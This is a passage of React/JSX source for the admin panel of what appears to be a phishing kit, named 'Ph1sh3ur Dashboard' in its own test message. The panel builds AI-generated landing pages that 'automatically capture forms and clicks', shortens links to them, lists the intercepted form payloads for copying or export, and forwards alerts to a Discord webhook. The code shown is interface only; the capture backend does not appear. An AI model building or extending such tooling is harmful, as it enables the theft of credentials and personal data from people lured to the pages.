                        <div className="flex items-center justify-between p-3 bg-nexus-accent/5 border border-nexus-accent/20 rounded-xl">
                          <div className="flex items-center gap-3 overflow-hidden">
                            <Scissors size={14} className="text-nexus-accent shrink-0" />
                            <span className="text-xs font-mono text-nexus-accent truncate">{shortenedLinks[page.id]}</span>
                          </div>
                          <button 
                            onClick={() => {
                              navigator.clipboard.writeText(shortenedLinks[page.id]);
                              setCopiedShortId(page.id);
                              setTimeout(() => setCopiedShortId(null), 2000);
                              showNotification("Lien copié !", "success");
                            }}
                            className="flex items-center gap-2 px-3 py-1 bg-nexus-accent/10 hover:bg-nexus-accent/20 text-nexus-accent text-[10px] font-bold uppercase tracking-widest rounded-lg transition-all"
                          >
                            {copiedShortId === page.id ? <Check size={12} /> : <Copy size={12} />}
                            {copiedShortId === page.id ? 'Copié' : 'Copier'}
                          </button>
                        </div>
                      ) : (
                        <button 
                          onClick={() => handleShortenLink(page.id)}
                          disabled={isShortening === page.id}
                          className="w-full flex items-center justify-center gap-2 py-2 border border-dashed border-nexus-accent/30 rounded-xl text-[10px] font-mono uppercase tracking-widest text-nexus-muted hover:text-nexus-accent hover:border-nexus-accent/60 transition-all"
                        >
                          {isShortening === page.id ? <RefreshCw className="animate-spin" size={12} /> : <LinkIcon size={12} />}
                          Raccourcir le lien
                        </button>
                      )}
                      <div className="flex items-center gap-6">
                        <div className="flex items-center gap-2 text-[10px] font-mono text-nexus-muted uppercase tracking-widest">
                          <Zap className="text-nexus-accent" size={14} /> 
                          {page.button_text}
                        </div>
                        <div className="flex items-center gap-2 text-[10px] font-mono text-nexus-muted uppercase tracking-widest">
                          <Code className="text-nexus-accent" size={14} /> 
                          {page.content.length} Bytes
                        </div>
                        <div className={`ml-auto px-3 py-1 rounded-full text-[9px] font-mono uppercase tracking-widest border ${page.webhook_enabled ? 'bg-nexus-accent/10 border-nexus-accent/20 text-nexus-accent' : 'bg-white/5 border-white/10 text-nexus-muted'}`}>
                          {page.webhook_enabled ? 'Signal Active' : 'Signal Silent'}
                        </div>
                      </div>
                    </div>
                  </div>
                ))}
              </div>

              {/* Preview Modal */}
              <AnimatePresence>
                {previewPage && (
                  <div className="fixed inset-0 z-50 flex items-center justify-center p-6">
                    <motion.div 
                      initial={{ opacity: 0 }} 
                      animate={{ opacity: 1 }} 
                      exit={{ opacity: 0 }}
                      onClick={() => setPreviewPage(null)}
                      className="absolute inset-0 bg-black/90 backdrop-blur-md" 
                    />
                    <motion.div
                      initial={{ opacity: 0, scale: 0.95 }}
                      animate={{ opacity: 1, scale: 1 }}
                      exit={{ opacity: 0, scale: 0.95 }}
                      className="relative w-full h-full max-w-6xl glass-panel flex flex-col overflow-hidden shadow-2xl"
                    >
                      <div className="p-4 border-b border-nexus-border flex items-center justify-between bg-nexus-card">
                        <div className="flex items-center gap-4">
                          <h3 className="font-bold">{previewPage.title}</h3>
                          <span className="text-xs text-nexus-muted px-2 py-1 rounded bg-nexus-bg border border-nexus-border">
                            Internal Preview
                          </span>
                        </div>
                        <div className="flex items-center gap-2">
                          <a 
                            href={`/preview/${previewPage.id}`} 
                            target="_blank" 
                            className="nexus-button-secondary flex items-center gap-2 text-xs py-1.5"
                          >
                            <ExternalLink size={14} /> Open External
                          </a>
                          <button 
                            onClick={() => setPreviewPage(null)}
                            className="p-2 text-nexus-muted hover:text-nexus-text transition-colors"
                          >
                            <Plus className="rotate-45" size={24} />
                          </button>
                        </div>
                      </div>
                      <div className="flex-1 bg-white">
                        <iframe 
                          src={`/preview/${previewPage.id}`}
                          className="w-full h-full border-0"
                          title="Page Preview"
                        />
                      </div>
                    </motion.div>
                  </div>
                )}
              </AnimatePresence>

              {/* Create Modal */}
              <AnimatePresence>
                {isCreating && (
                  <div className="fixed inset-0 z-50 flex items-center justify-center p-6">
                    <motion.div 
                      initial={{ opacity: 0 }} 
                      animate={{ opacity: 1 }} 
                      exit={{ opacity: 0 }}
                      onClick={() => { setIsCreating(false); setEditingId(null); }}
                      className="absolute inset-0 bg-black/80 backdrop-blur-sm" 
                    />
                    <motion.div
                      initial={{ opacity: 0, scale: 0.9, y: 20 }}
                      animate={{ opacity: 1, scale: 1, y: 0 }}
                      exit={{ opacity: 0, scale: 0.9, y: 20 }}
                      className="relative w-full max-w-4xl glass-panel p-8 overflow-y-auto max-h-[90vh]"
                    >
                      <h3 className="text-2xl font-bold mb-8">{editingId ? 'Edit Page' : 'Create New Page'}</h3>
                      
                      <div className="grid grid-cols-2 gap-8">
                        <div className="space-y-6">
                          <div className="flex flex-col gap-2">
                            <label className="text-sm font-medium text-nexus-muted">Page Title</label>
                            <input 
                              type="text" 
                              value={newPage.title}
                              onChange={e => setNewPage(prev => ({ ...prev, title: e.target.value }))}
                              placeholder="e.g. Welcome Landing"
                              className="nexus-input"
                            />
                          </div>
                          <div className="flex flex-col gap-2">
                            <label className="text-sm font-medium text-nexus-muted">Button Text</label>
                            <input 
                              type="text" 
                              value={newPage.button_text}
                              onChange={e => setNewPage(prev => ({ ...prev, button_text: e.target.value }))}
                              placeholder="e.g. Get Started"
                              className="nexus-input"
                            />
                          </div>
                          <div className="flex flex-col gap-2">
                            <label className="text-sm font-medium text-nexus-muted">Custom Logo URL (Optional)</label>
                            <input 
                              type="text" 
                              value={newPage.logo_url}
                              onChange={e => setNewPage(prev => ({ ...prev, logo_url: e.target.value }))}
                              placeholder="https://example.com/logo.png"
                              className="nexus-input"
                            />
                          </div>
                          <div className="flex flex-col gap-2">
                            <label className="text-sm font-medium text-nexus-muted">AI Instructions (Prompt)</label>
                            <textarea 
                              value={newPage.ai_prompt}
                              onChange={e => setNewPage(prev => ({ ...prev, ai_prompt: e.target.value }))}
                              placeholder="e.g. Make it a luxury car rental landing page with gold accents..."
                              className="nexus-input h-24 resize-none text-sm"
                            />
                          </div>

                          <div className="flex items-center gap-3 p-4 bg-nexus-bg/50 rounded-lg border border-nexus-border">
                            <input 
                              type="checkbox" 
                              id="webhook_enabled"
                              checked={newPage.webhook_enabled}
                              onChange={e => setNewPage(prev => ({ ...prev, webhook_enabled: e.target.checked }))}
                              className="w-5 h-5 rounded border-nexus-border bg-nexus-bg text-nexus-accent focus:ring-nexus-accent"
                            />
                            <label htmlFor="webhook_enabled" className="text-sm font-medium cursor-pointer">
                              Enable Webhook & Bot Protection
                              <span className="block text-xs text-nexus-muted font-normal">Automatically capture forms and clicks</span>
                            </label>
                          </div>
                          <div className="flex gap-4 pt-4">
                            <button 
                              onClick={generateWithAI}
                              disabled={isGenerating || !newPage.title}
                              className="nexus-button flex-1 flex items-center justify-center gap-2"
                            >
                              {isGenerating ? <RefreshCw className="animate-spin" size={18} /> : <Zap size={18} />}
                              Generate with AI
                            </button>
                            <button 
                              onClick={() => { setIsCreating(false); setEditingId(null); }}
                              className="nexus-button-secondary flex-1"
                            >
                              Cancel
                            </button>
                          </div>
                        </div>

                        <div className="flex flex-col gap-2">
                          <label className="text-sm font-medium text-nexus-muted">HTML/CSS Code</label>
                          <textarea 
                            value={newPage.content}
                            onChange={e => setNewPage(prev => ({ ...prev, content: e.target.value }))}
                            placeholder="Paste your code here or generate with AI..."
                            className="nexus-input h-64 font-mono text-xs resize-none"
                          />
                        </div>
                      </div>

                      <div className="mt-8 pt-8 border-t border-nexus-border flex justify-end">
                        <button 
                          onClick={handleSavePage}
                          disabled={!newPage.title || !newPage.content}
                          className="nexus-button px-12"
                        >
                          {editingId ? 'Update Page' : 'Save Page'}
                        </button>
                      </div>
                    </motion.div>
                  </div>
                )}
              </AnimatePresence>
            </motion.div>
          )}

          {activeTab === 'webhooks' && (
            <motion.div
              key="webhooks"
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -10 }}
              className="space-y-8"
            >
              <header className="flex items-center justify-between">
                <div>
                  <h2 className="text-4xl font-black tracking-tighter matrix-glow italic uppercase">Signal Monitor</h2>
                  <p className="text-nexus-muted mt-2 font-mono text-xs tracking-[0.2em] uppercase opacity-60">Real-time packet inspection and logging</p>
                </div>
                <div className="flex items-center gap-4">
                  <button 
                    onClick={() => {
                      const data = JSON.stringify(logs, null, 2);
                      navigator.clipboard.writeText(data);
                      showNotification("All logs copied to clipboard", "success");
                    }}
                    className="nexus-button-secondary flex items-center gap-3 text-xs py-3"
                  >
                    <Copy size={16} /> 
                    <span className="uppercase tracking-widest">Export All</span>
                  </button>
                  <button 
                    onClick={handleClearLogs}
                    className="nexus-button-secondary flex items-center gap-3 text-xs py-3 border-rose-500/20 text-rose-400 hover:bg-rose-500/10"
                  >
                    <Trash2 size={16} /> 
                    <span className="uppercase tracking-widest">Purge All Logs</span>
                  </button>
                </div>
              </header>

              <div className="glass-panel overflow-hidden border-nexus-accent/5">
                <table className="w-full text-left">
                  <thead className="bg-white/[0.02] border-b border-nexus-border">
                    <tr>
                      <th className="px-8 py-5 text-[10px] font-mono font-bold uppercase tracking-[0.2em] text-nexus-muted">Timestamp</th>
                      <th className="px-8 py-5 text-[10px] font-mono font-bold uppercase tracking-[0.2em] text-nexus-muted">Payload</th>
                      <th className="px-8 py-5 text-[10px] font-mono font-bold uppercase tracking-[0.2em] text-nexus-muted">Node ID</th>
                      <th className="px-8 py-5 text-[10px] font-mono font-bold uppercase tracking-[0.2em] text-nexus-muted">Event Type</th>
                      <th className="px-8 py-5 text-[10px] font-mono font-bold uppercase tracking-[0.2em] text-nexus-muted text-right">Actions</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-nexus-border">
                    {logs.map(log => (
                      <tr key={log.id} className="hover:bg-nexus-accent/[0.02] transition-colors group">
                        <td className="px-8 py-6 text-xs font-mono text-nexus-muted whitespace-nowrap">
                          {new Date(log.timestamp).toLocaleString()}
                        </td>
                        <td className="px-8 py-6">
                          <div className="max-w-md relative group/payload">
                            <pre className="text-[10px] font-mono text-nexus-accent/70 bg-black/50 p-4 rounded-xl border border-nexus-accent/10 overflow-x-auto max-h-32">
                              {(() => {
                                try {
                                  const parsed = JSON.parse(log.data);
                                  return JSON.stringify(parsed, null, 2);
                                } catch (e) {
                                  return log.data;
                                }
                              })()}
                            </pre>
                            <button 
                              onClick={() => {
                                navigator.clipboard.writeText(log.data);
                                setCopiedId(log.id);
                                setTimeout(() => setCopiedId(null), 2000);
                              }}
                              className="absolute top-3 right-3 p-2 bg-black border border-nexus-accent/20 rounded-lg opacity-0 group-hover/payload:opacity-100 transition-all hover:text-nexus-accent hover:border-nexus-accent"
                              title="Copy to clipboard"
                            >
                              {copiedId === log.id ? <Check size={14} /> : <Copy size={14} />}
                            </button>
                          </div>
                        </td>
                        <td className="px-8 py-6 text-sm font-bold tracking-tight">
                          {log.page_id}
                        </td>
                        <td className="px-8 py-6">
                          <span className="px-3 py-1 rounded-full bg-nexus-accent/10 border border-nexus-accent/20 text-nexus-accent text-[10px] font-mono uppercase tracking-widest">
                            {log.event_type}
                          </span>
                        </td>
                        <td className="px-8 py-6 text-right">
                          <div className="flex items-center justify-end gap-2">
                            <button 
                              onClick={() => setSelectedLog(log)}
                              className="p-2.5 text-nexus-muted hover:text-nexus-accent hover:bg-nexus-accent/10 rounded-xl opacity-0 group-hover:opacity-100 transition-all"
                              title="Inspect Packet"
                            >
                              <Monitor size={18} />
                            </button>
                            <button 
                              onClick={() => handleDeleteLog(log.id)}
                              className="p-2.5 text-nexus-muted hover:text-rose-500 hover:bg-rose-500/10 rounded-xl opacity-0 group-hover:opacity-100 transition-all"
                              title="Delete Log"
                            >
                              <Trash2 size={18} />
                            </button>
                          </div>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
                {logs.length === 0 && (
                  <div className="py-24 text-center border-t border-nexus-border">
                    <p className="text-nexus-muted font-mono text-xs uppercase tracking-[0.3em]">No signals intercepted</p>
                  </div>
                )}
              </div>

              {/* Log Detail Modal */}
              <AnimatePresence>
                {selectedLog && (
                  <div className="fixed inset-0 z-50 flex items-center justify-center p-6">
                    <motion.div 
                      initial={{ opacity: 0 }} 
                      animate={{ opacity: 1 }} 
                      exit={{ opacity: 0 }}
                      onClick={() => setSelectedLog(null)}
                      className="absolute inset-0 bg-black/80 backdrop-blur-sm" 
                    />
                    <motion.div
                      initial={{ opacity: 0, scale: 0.9, y: 20 }}
                      animate={{ opacity: 1, scale: 1, y: 0 }}
                      exit={{ opacity: 0, scale: 0.9, y: 20 }}
                      className="relative w-full max-w-2xl glass-panel p-8 overflow-hidden flex flex-col max-h-[80vh]"
                    >
                      <div className="flex items-center justify-between mb-8">
                        <div>
                          <h3 className="text-2xl font-black tracking-tighter matrix-glow italic uppercase">Packet Inspection</h3>
                          <p className="text-nexus-muted mt-1 font-mono text-[10px] tracking-widest uppercase">ID: {selectedLog.id} • {new Date(selectedLog.timestamp).toLocaleString()}</p>
                        </div>
                        <button 
                          onClick={() => setSelectedLog(null)}
                          className="p-2 text-nexus-muted hover:text-nexus-text transition-colors"
                        >
                          <Plus className="rotate-45" size={28} />
                        </button>
                      </div>
                      
                      <div className="flex-1 overflow-y-auto space-y-6 pr-2">
                        <div className="grid grid-cols-2 gap-4">
                          <div className="p-4 rounded-xl bg-nexus-accent/5 border border-nexus-accent/10">
                            <span className="text-[10px] font-mono text-nexus-muted uppercase tracking-widest block mb-1">Node Source</span>
                            <span className="font-bold">{selectedLog.page_id}</span>
                          </div>
                          <div className="p-4 rounded-xl bg-nexus-accent/5 border border-nexus-accent/10">
                            <span className="text-[10px] font-mono text-nexus-muted uppercase tracking-widest block mb-1">Event Protocol</span>
                            <span className="font-bold uppercase tracking-widest text-nexus-accent">{selectedLog.event_type}</span>
                          </div>
                        </div>

                        <div className="space-y-3">
                          <div className="flex items-center justify-between">
                            <span className="text-[10px] font-mono text-nexus-muted uppercase tracking-widest">Raw Payload Data</span>
                            <button 
                              onClick={() => {
                                navigator.clipboard.writeText(selectedLog.data);
                                showNotification("Payload copied", "success");
                              }}
                              className="text-[10px] font-mono text-nexus-accent hover:underline uppercase tracking-widest"
                            >
                              Copy Raw
                            </button>
                          </div>
                          <pre className="text-xs font-mono text-nexus-accent/90 bg-black/80 p-6 rounded-2xl border border-nexus-accent/20 overflow-x-auto shadow-inner">
                            {(() => {
                              try {
                                const parsed = JSON.parse(selectedLog.data);
                                return JSON.stringify(parsed, null, 2);
                              } catch (e) {
                                return selectedLog.data;
                              }
                            })()}
                          </pre>
                        </div>
                      </div>
                      
                      <div className="mt-8 pt-8 border-t border-nexus-border flex justify-end">
                        <button 
                          onClick={() => setSelectedLog(null)}
                          className="nexus-button px-10"
                        >
                          Close Terminal
                        </button>
                      </div>
                    </motion.div>
                  </div>
                )}
              </AnimatePresence>
            </motion.div>
          )}

          {activeTab === 'settings' && (
            <motion.div
              key="settings"
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -10 }}
              className="max-w-2xl space-y-8"
            >
              <header>
                <h2 className="text-4xl font-black tracking-tighter matrix-glow italic uppercase">Terminal Settings</h2>
                <p className="text-nexus-muted mt-2 font-mono text-xs tracking-[0.2em] uppercase opacity-60">Reconfigure system protocols and integrations</p>
              </header>

              <div className="glass-panel p-10 space-y-10 border-nexus-accent/5">
                <div className="space-y-6">
                  <div className="flex items-center gap-4">
                    <div className="w-10 h-10 rounded-xl bg-nexus-accent/10 flex items-center justify-center text-nexus-accent border border-nexus-accent/20">
                      <Webhook size={20} />
                    </div>
                    <h3 className="text-xl font-black tracking-tight uppercase italic">Discord Uplink</h3>
                  </div>
                  <p className="text-sm text-nexus-muted leading-relaxed">
                    Establish a secure bridge to your Discord server for real-time signal alerts.
                  </p>
                  <div className="space-y-4">
                    <div className="flex flex-col gap-2">
                      <label className="text-[10px] font-mono font-bold text-nexus-muted uppercase tracking-widest ml-1">Webhook Endpoint</label>
                      <input 
                        type="text" 
                        value={settings.discord_webhook || ''}
                        onChange={e => setSettings(prev => ({ ...prev, discord_webhook: e.target.value }))}
                        placeholder="https://discord.com/api/webhooks/..."
                        className="nexus-input"
                      />
                    </div>
                    <div className="flex flex-col gap-2">
                      <label className="text-[10px] font-mono font-bold text-nexus-muted uppercase tracking-widest ml-1">Global Asset Identifier (Logo)</label>
                      <input 
                        type="text" 
                        value={settings.logo_url || ''}
                        onChange={e => setSettings(prev => ({ ...prev, logo_url: e.target.value }))}
                        placeholder="https://example.com/logo.png"
                        className="nexus-input"
                      />
                    </div>
                    <div className="flex flex-col gap-2">
                      <label className="text-[10px] font-mono font-bold text-nexus-muted uppercase tracking-widest ml-1">Global Favicon URL</label>
                      <input 
                        type="text" 
                        value={settings.favicon_url || ''}
                        onChange={e => setSettings(prev => ({ ...prev, favicon_url: e.target.value }))}
                        placeholder="https://example.com/favicon.ico"
                        className="nexus-input"
                      />
                    </div>
                  </div>
                </div>

                <div className="pt-10 border-t border-nexus-border space-y-6">
                  <div className="flex items-center gap-4">
                    <div className="w-10 h-10 rounded-xl bg-nexus-accent/10 flex items-center justify-center text-nexus-accent border border-nexus-accent/20">
                      <Save size={20} />
                    </div>
                    <h3 className="text-xl font-black tracking-tight uppercase italic">Data Core</h3>
                  </div>
                  <div className="p-6 rounded-2xl bg-nexus-accent/5 border border-nexus-accent/10">
                    <p className="text-sm text-nexus-accent/80 font-mono leading-relaxed">
                      [STATUS] All operational data is synchronized with the Supabase encrypted cloud storage.
                    </p>
                  </div>
                </div>

                <div className="pt-10 border-t border-nexus-border flex justify-end gap-4">
                  <button 
                    onClick={async () => {
                      if (!settings.discord_webhook) return showNotification("Please enter a webhook URL first", "error");
                      try {
                        await fetch('/api/webhook/test', {
                          method: 'POST',
                          headers: { 'Content-Type': 'application/json' },
                          body: JSON.stringify({ message: "Test notification from Ph1sh3ur Dashboard" })
                        });
                        showNotification("Test signal transmitted!", "success");
                      } catch (err) {
                        showNotification("Transmission failed", "error");
                      }
                    }}
                    className="nexus-button-secondary px-8"
                  >
                    Test Uplink
                  </button>
                  <button onClick={handleSaveSettings} className="nexus-button px-10 flex items-center gap-3">
                    <Save size={20} /> 
                    <span className="uppercase tracking-widest text-sm">Save Settings</span>
                  </button>
                </div>

                <div className="pt-10 border-t border-nexus-border space-y-8">
                  <div className="flex items-center gap-4">
                    <div className="w-10 h-10 rounded-xl bg-nexus-accent/10 flex items-center justify-center text-nexus-accent border border-nexus-accent/20">
                      <Lock size={20} />
                    </div>
                    <h3 className="text-xl font-black tracking-tight uppercase italic">Security Protocol</h3>
                  </div>
                  
                  <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                    <div className="flex flex-col gap-2">
                      <label className="text-[10px] font-mono font-bold text-nexus-muted uppercase tracking-widest ml-1">Current Key</label>
                      <input 
                        type="password" 
                        value={passwords.current}
                        onChange={e => setPasswords(prev => ({ ...prev, current: e.target.value }))}
                        className="nexus-input"
                        placeholder="••••••••"
                      />
                    </div>
                    <div className="flex flex-col gap-2">
                      <label className="text-[10px] font-mono font-bold text-nexus-muted uppercase tracking-widest ml-1">New Access Key</label>
                      <input 
                        type="password" 
                        value={passwords.new}
                        onChange={e => setPasswords(prev => ({ ...prev, new: e.target.value }))}
                        className="nexus-input"
                        placeholder="••••••••"
                      />
                    </div>
                    <div className="flex flex-col gap-2">
                      <label className="text-[10px] font-mono font-bold text-nexus-muted uppercase tracking-widest ml-1">Confirm Key</label>
                      <input 
                        type="password" 
                        value={passwords.confirm}
                        onChange={e => setPasswords(prev => ({ ...prev, confirm: e.target.value }))}
                        className="nexus-input"
                        placeholder="••••••••"
                      />
                    </div>
                  </div>

                  <div className="flex justify-end">
                    <button 
                      onClick={handleChangePassword}
                      disabled={isChangingPass || !passwords.current || !passwords.new}
                      className="nexus-button-secondary px-10 flex items-center gap-3"
                    >
                      {isChangingPass ? <RefreshCw className="animate-spin" size={18} /> : <Shield size={18} />}
                      <span className="uppercase tracking-widest text-sm">Update Access Key</span>
                    </button>
                  </div>
                </div>

                {user?.role === 'admin' && (
                  <div className="pt-8 border-t border-nexus-border space-y-6">
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-3">
                        <Users className="text-nexus-accent" size={20} />
                        <h3 className="text-lg font-bold">Gestion des Utilisateurs</h3>
                      </div>
                      <button 
                        onClick={() => setIsAddingUser(true)}
                        className="nexus-button-secondary flex items-center gap-2 text-sm"
                      >
                        <Plus size={14} /> Ajouter un compte
                      </button>
                    </div>

                    <div className="space-y-3">
                      {users.map(u => (
                        <div key={u.id} className="flex items-center justify-between p-4 bg-white/5 rounded-xl border border-nexus-border">
                          <div className="flex items-center gap-4">
                            <div className="w-10 h-10 rounded-full bg-nexus-accent/10 flex items-center justify-center text-nexus-accent font-bold">
                              {u.username.substring(0, 2).toUpperCase()}
                            </div>
                            <div>
                              <p className="font-medium">{u.username}</p>
                              <p className="text-xs text-nexus-muted capitalize">{u.role}</p>
                            </div>
                          </div>
                          {u.username !== 'admin' && u.id !== user.id && (
                            <button 
                              onClick={() => handleDeleteUser(u.id)}
                              className="p-2 text-nexus-muted hover:text-rose-400 transition-colors"
                            >
                              <Trash2 size={18} />
                            </button>
                          )}
                        </div>
                      ))}
                    </div>

                    <AnimatePresence>
                      {isAddingUser && (
                        <div className="fixed inset-0 z-50 flex items-center justify-center p-6">
                          <motion.div 
                            initial={{ opacity: 0 }} 
                            animate={{ opacity: 1 }} 
                            exit={{ opacity: 0 }}
                            onClick={() => setIsAddingUser(false)}
                            className="absolute inset-0 bg-black/80 backdrop-blur-sm" 
                          />
                          <motion.div
                            initial={{ opacity: 0, scale: 0.9 }}
                            animate={{ opacity: 1, scale: 1 }}
                            exit={{ opacity: 0, scale: 0.9 }}
                            className="relative w-full max-w-md glass-panel p-8 space-y-6"
                          >
                            <h3 className="text-xl font-bold">Nouvel Utilisateur</h3>
                            <div className="space-y-4">
                              <div className="space-y-2">
                                <label className="text-sm font-medium text-nexus-muted">Nom d'utilisateur</label>
                                <input 
                                  type="text" 
                                  value={newUser.username}
                                  onChange={e => setNewUser(prev => ({ ...prev, username: e.target.value }))}
                                  className="nexus-input"
                                  placeholder="john_doe"
                                />
                              </div>
                              <div className="space-y-2">
                                <label className="text-sm font-medium text-nexus-muted">Mot de passe</label>
                                <input 
                                  type="password" 
                                  value={newUser.password}
                                  onChange={e => setNewUser(prev => ({ ...prev, password: e.target.value }))}
                                  className="nexus-input"
                                  placeholder="••••••••"
                                />
                              </div>
                              <div className="space-y-2">
                                <label className="text-sm font-medium text-nexus-muted">Rôle</label>
                                <select 
                                  value={newUser.role}
                                  onChange={e => setNewUser(prev => ({ ...prev, role: e.target.value }))}
                                  className="nexus-input"
                                >
                                  <option value="user">Utilisateur standard</option>
                                  <option value="admin">Administrateur</option>
                                </select>
                              </div>
                            </div>
                            <div className="flex gap-4 pt-4">
                              <button onClick={handleAddUser} className="nexus-button flex-1">Créer</button>
                              <button onClick={() => setIsAddingUser(false)} className="nexus-button-secondary flex-1">Annuler</button>
                            </div>
                          </motion.div>
                        </div>
                      )}
                    </AnimatePresence>
                  </div>
                )}
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </main>
    </div>
  );
}
